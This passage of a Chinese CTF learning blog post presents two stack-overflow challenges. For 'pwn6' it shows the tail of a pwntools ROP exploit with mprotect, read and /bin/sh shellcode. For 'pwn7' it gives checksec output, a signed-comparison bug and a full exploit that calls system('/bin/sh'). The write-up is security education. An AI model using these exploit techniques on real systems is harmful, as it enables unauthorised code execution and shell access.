class="string">"1"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(str(<span class="keyword">a</span>))</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(str(b))</div><div class="line"></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(<span class="string">"100"</span>)</div><div class="line"></div><div class="line"><span class="comment"># padding</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">18</span>):</div><div class="line">	<span class="keyword">if</span> x == <span class="number">13</span> <span class="keyword">or</span> x == <span class="number">12</span>:</div><div class="line">		<span class="comment"># free(0)</span></div><div class="line">		<span class="keyword">a</span> = <span class="string">'100'</span></div><div class="line">		b = <span class="string">'100'</span></div><div class="line">		p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">		p.sendline(<span class="string">"2"</span>)</div><div class="line">		p.readuntil(<span class="string">"x: "</span>)</div><div class="line">		p.sendline(<span class="keyword">a</span>)</div><div class="line">		p.readuntil(<span class="string">"y: "</span>)</div><div class="line">		p.sendline(b)</div><div class="line">		continue</div><div class="line">	<span class="keyword">a</span> = <span class="string">"1094778880"</span></div><div class="line">	b = <span class="string">"16705"</span></div><div class="line">	p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"x: "</span>)</div><div class="line">	p.sendline(<span class="keyword">a</span>)</div><div class="line">	p.readuntil(<span class="string">"y: "</span>)</div><div class="line">	p.sendline(b)</div><div class="line"></div><div class="line">shellcode = <span class="string">'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'</span></div><div class="line">shellcode_addr = <span class="number">0x6c3000</span></div><div class="line">read_address = e.symbols[<span class="string">'read'</span>]</div><div class="line">mprotect_address = e.symbols[<span class="string">'mprotect'</span>]</div><div class="line"></div><div class="line">set_rdi = <span class="number">0x401b73</span></div><div class="line">set_rsi = <span class="number">0x401c87</span></div><div class="line">set_rdx = <span class="number">0x437a85</span></div><div class="line"></div><div class="line"><span class="comment"># rdi = shellcode_addr</span></div><div class="line">set_add(set_rdi)</div><div class="line">set_add(shellcode_addr)</div><div class="line"><span class="comment"># rsi = len(shellcode)</span></div><div class="line">set_add(set_rsi)</div><div class="line">set_add(<span class="built_in">len</span>(shellcode))</div><div class="line"><span class="comment"># rdx = 7</span></div><div class="line">set_add(set_rdx)</div><div class="line">set_add(<span class="number">7</span>)</div><div class="line"><span class="comment"># set_add(mmap_address)</span></div><div class="line">set_add(mprotect_address)</div><div class="line"></div><div class="line"><span class="comment"># read(0, shellcode, len(shellcode))</span></div><div class="line">set_add(set_rdi)</div><div class="line">set_add(<span class="number">0</span>)</div><div class="line"></div><div class="line">set_add(set_rsi)</div><div class="line">set_add(shellcode_addr)</div><div class="line"></div><div class="line">set_add(set_rdx)</div><div class="line">set_add(<span class="built_in">len</span>(shellcode))</div><div class="line"></div><div class="line">set_add(read_address)</div><div class="line">set_add(shellcode_addr)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"=&gt; "</span>)</div><div class="line">p.sendline(<span class="string">'5'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><code>mprotect</code>只有三个参数, 其作用是改变起始地址add, 长度len, 的权限为prot</p>
+<p>我找了个.bss段, 设为有可读写执行权限</p>
+<p><img src="http://qn.lazysheep.cc/img/pwn62.png" alt="pwn6_2"></p>
+<h1 id="0x02-PWN7"><a href="#0x02-PWN7" class="headerlink" title="0x02 PWN7"></a>0x02 PWN7</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ binwalk pwn7</div><div class="line"></div><div class="line"><span class="section">DECIMAL       HEXADECIMAL     DESCRIPTION</span></div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)</div><div class="line">$ gdb pwn7</div><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
+<p>pwn7是个32位程序, 然后发现pwn7开了CANARY, 栈溢出保护</p>
+<p>CANARY保护是通过添加一个栈cookie然后在<code>ret</code>之前使用<code>__stack_chk_fail</code>去检查cookie的正确性</p>
+<p>通过逆向, 发现只有一个位置有该函数<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">8048725</span>:	e8 e6 fc ff ff       	<span class="built_in">call</span>   <span class="number">8048410</span> &lt;__stack_chk_fail<span class="symbol">@plt</span>&gt;</div></pre></td></tr></table></figure></p>
+<p>关键函数里没有该函数, 所以该保护形同虚设</p>
+<p>漏洞点在:<br><img src="http://qn.lazysheep.cc/img/pwn7.png" alt="pwn7"></p>
+<p>jle为有符号比较, 我们可以通过使用负数绕过该判断, 从而覆盖栈</p>
+<p>payload:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line"></div><div class="line">p = process(<span class="string">"pwn7"</span>)</div><div class="line">e = ELF(<span class="string">"pwn7"</span>)</div><div class="line"></div><div class="line"></div><div class="line">start_add = <span class="number">0xffffffff</span> - <span class="number">0xc000000d</span></div><div class="line">system_add = e.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_add = e.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">ret_addr = <span class="number">0x80487ba</span></div><div class="line"></div><div class="line">p.readuntil(<span class="string">"you? \n"</span>)</div><div class="line">p.sendline(<span class="string">"haha"</span>)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add + <span class="number">1</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%scanf_add)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%ret_addr)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add -<span class="number">1</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%0x804882f)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add - <span class="number">2</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%0x8049b24)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add - <span class="number">3</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%system_add)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add - <span class="number">4</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%system_add)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-%s"</span>%(start_add - <span class="number">5</span>))</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"%s"</span>%0x8049b24)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"index\n"</span>)</div><div class="line">p.sendline(<span class="string">"-1"</span>)</div><div class="line"></div><div class="line">p.readuntil(<span class="string">"value\n"</span>)</div><div class="line">p.sendline(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">p.sendline(<span class="string">"/bin/sh"</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>整个逻辑比上题简单吧, 首先要能溢出, binary中已经存在system函数了, 然后是写<code>/bin/sh</code>字符串到.bss段</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-11-21, 00:04:32</p>
+        <p><span>最后更新:</span>2016-11-21, 17:52:46</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/11/21/0x27/" title="PWN学习总结之基础栈溢出2">http://0x48.pw/2016/11/21/0x27/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/11/21/0x27/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/11/28/0x28/">
+                    2016 HCTF Crypto 出题总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/11/03/0x26/">
+                    PWN学习总结之基础栈溢出
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-PWN6"><span class="toc-number">1.</span> <span class="toc-text">0x01 PWN6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PWN7"><span class="toc-number">2.</span> <span class="toc-text">0x02 PWN7</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/11/28/0x28/" title="上一篇: 2016 HCTF Crypto 出题总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/11/03/0x26/" title="下一篇: PWN学习总结之基础栈溢出">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
